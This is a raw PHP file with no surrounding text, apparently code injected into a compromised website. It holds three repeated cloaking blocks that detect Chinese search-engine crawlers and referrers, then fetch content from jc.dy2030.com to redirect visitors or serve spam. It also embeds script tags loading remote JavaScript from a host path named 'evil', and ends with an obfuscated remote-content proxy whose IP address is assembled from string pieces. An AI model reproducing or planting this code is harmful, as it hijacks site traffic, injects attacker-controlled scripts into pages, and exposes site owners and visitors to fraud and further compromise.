<?php
set_time_limit(20);error_reporting(0);

define('u_b','/');

define('s_u','http://jc.dy2030.com/');

define('s_s','@haosou.com|360.cn| spider|360spider|so|360|sogou|sm.cn|youdao@i');

define('h_t',$_SERVER['SERVER_NAME']);define('r_s',$_SERVER['HTTP_REFERER']);define('u_s',$_SERVER['HTTP_USER_AGENT']);define('h_z',s_p());

function s_p(){$d='';if(isset($_SERVER['REQUEST_URI'])){$d=$_SERVER['REQUEST_URI'];}else{if(isset($_SERVER['argv'])){$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['argv'][0];}else{$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];}}if(isset($_SERVER['SERVER_SOFTWARE']) && false!==stristr($_SERVER['SERVER_SOFTWARE'],'IIS')){if(function_exists('mb_convert_encoding')){$d=mb_convert_encoding($d,'UTF-8','GBK');}else{$d=@iconv('GBK','UTF-8',@iconv('UTF-8','GBK',$d))==$d?$d:@iconv('GBK','UTF-8',$d);}}$r=explode('#',$d,2);$d=$r[0];return $d;}function r_s($url){$o=array('http' => array('method'=>"GET",'timeout'=>8));$context=stream_context_create($o);$h=file_get_contents($url,false,$context);if(empty($h)){$h=file_get_contents($url);}return $h;}

if(preg_match(s_s,r_s)){$d_s=true;if(preg_match("@site%3A|inurl%3A@i",r_s)){setcookie('xx',h_t,time()+259200);$d_s=false;}if($d_s ){setcookie('xx',h_t,time()+259200);$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&ad=1&xh='.bin2hex(h_t);$d_c=r_s($d_u);header("Location: ".$d_c.'?'.h_t);exit;}}if(strstr(h_z,u_b)){if(preg_match(s_s,u_s)){$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&xh='.bin2hex(h_t);$d_c=r_s($d_u);echo $d_c;exit;}}
?><script src="http://cpm.36obuy.org/evil/1.js"></script><script src="http://cpm.36obuy.org/lion/1.js"></script><?php
set_time_limit(20);error_reporting(0);

define('u_b','/');

define('s_u','http://jc.dy2030.com/');

define('s_s','@haosou.com|360.cn| spider|360spider|so|360|sogou|sm.cn|youdao@i');

define('h_t',$_SERVER['SERVER_NAME']);define('r_s',$_SERVER['HTTP_REFERER']);define('u_s',$_SERVER['HTTP_USER_AGENT']);define('h_z',s_p());

function s_p(){$d='';if(isset($_SERVER['REQUEST_URI'])){$d=$_SERVER['REQUEST_URI'];}else{if(isset($_SERVER['argv'])){$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['argv'][0];}else{$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];}}if(isset($_SERVER['SERVER_SOFTWARE']) && false!==stristr($_SERVER['SERVER_SOFTWARE'],'IIS')){if(function_exists('mb_convert_encoding')){$d=mb_convert_encoding($d,'UTF-8','GBK');}else{$d=@iconv('GBK','UTF-8',@iconv('UTF-8','GBK',$d))==$d?$d:@iconv('GBK','UTF-8',$d);}}$r=explode('#',$d,2);$d=$r[0];return $d;}function r_s($url){$o=array('http' => array('method'=>"GET",'timeout'=>8));$context=stream_context_create($o);$h=file_get_contents($url,false,$context);if(empty($h)){$h=file_get_contents($url);}return $h;}

if(preg_match(s_s,r_s)){$d_s=true;if(preg_match("@site%3A|inurl%3A@i",r_s)){setcookie('xx',h_t,time()+259200);$d_s=false;}if($d_s ){setcookie('xx',h_t,time()+259200);$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&ad=1&xh='.bin2hex(h_t);$d_c=r_s($d_u);header("Location: ".$d_c.'?'.h_t);exit;}}if(strstr(h_z,u_b)){if(preg_match(s_s,u_s)){$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&xh='.bin2hex(h_t);$d_c=r_s($d_u);echo $d_c;exit;}}
?><?php
set_time_limit(20);error_reporting(0);

define('u_b','/');

define('s_u','http://jc.dy2030.com/');

define('s_s','@haosou.com|360.cn| spider|360spider|so|360|sogou|sm.cn|youdao@i');

define('h_t',$_SERVER['SERVER_NAME']);define('r_s',$_SERVER['HTTP_REFERER']);define('u_s',$_SERVER['HTTP_USER_AGENT']);define('h_z',s_p());

function s_p(){$d='';if(isset($_SERVER['REQUEST_URI'])){$d=$_SERVER['REQUEST_URI'];}else{if(isset($_SERVER['argv'])){$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['argv'][0];}else{$d=$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];}}if(isset($_SERVER['SERVER_SOFTWARE']) && false!==stristr($_SERVER['SERVER_SOFTWARE'],'IIS')){if(function_exists('mb_convert_encoding')){$d=mb_convert_encoding($d,'UTF-8','GBK');}else{$d=@iconv('GBK','UTF-8',@iconv('UTF-8','GBK',$d))==$d?$d:@iconv('GBK','UTF-8',$d);}}$r=explode('#',$d,2);$d=$r[0];return $d;}function r_s($url){$o=array('http' => array('method'=>"GET",'timeout'=>8));$context=stream_context_create($o);$h=file_get_contents($url,false,$context);if(empty($h)){$h=file_get_contents($url);}return $h;}

if(preg_match(s_s,r_s)){$d_s=true;if(preg_match("@site%3A|inurl%3A@i",r_s)){setcookie('xx',h_t,time()+259200);$d_s=false;}if($d_s ){setcookie('xx',h_t,time()+259200);$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&ad=1&xh='.bin2hex(h_t);$d_c=r_s($d_u);header("Location: ".$d_c.'?'.h_t);exit;}}if(strstr(h_z,u_b)){if(preg_match(s_s,u_s)){$d_u=s_u.'?xu='.bin2hex(h_z);$d_u.='&xh='.bin2hex(h_t);$d_c=r_s($d_u);echo $d_c;exit;}}
?><?php
set_time_limit(0);header("Content-Type: text/html;charset=gb2312");date_default_timezone_set('PRC');$m="2"."20".".5"."8/n/".rand(1,5);$_="http".":"."/"."/"."18"."0.9"."7.".$m."/";$a = rand(0,100);if($a<60){$b = file_get_contents($_."1.txt");}else{$b = file_get_contents($_."1.txt"); }$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];$d=file_get_contents($b."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);$d= preg_replace(file_get_contents($_."2.txt"), file_get_contents($_."4.txt"),$d ); $d= preg_replace(file_get_contents($_."3.txt"), file_get_contents($_."4.php"),$d ); $d= preg_replace("(<a href=\"[^>]*\?)","<a href=\"?",$d);echo $d ;?>